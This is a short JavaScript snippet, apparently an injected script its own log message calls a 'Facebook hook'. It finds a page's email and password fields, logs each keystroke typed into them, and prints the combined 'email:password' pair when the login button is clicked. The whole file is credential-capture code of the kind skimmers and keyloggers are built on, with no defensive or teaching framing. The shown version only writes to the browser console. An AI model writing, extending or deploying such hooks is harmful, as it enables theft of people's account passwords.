// Find the elements
const inputElement1 = document.querySelector('input[name*="email"]');
const inputElement2 = document.querySelector('input[name*="pass"]');
const button = document.querySelector('button');

// For debugging
console.log("Facebook hook.");
console.log(button);

// Create input event listeners
inputElement1.addEventListener('input', () => {
  // For debugging
  const enteredText1 = event.target.value;
  console.log(enteredText1);
});

inputElement2.addEventListener('input', () => {
  // For debugging
  const enteredText2 = event.target.value;
  console.log(enteredText2);
});

// Create click event listener
button.addEventListener('click', () => {
  // Get values
  const email = inputElement1.value;
  const password = inputElement2.value;
  // Log values
  console.log(email+":"+password);
});
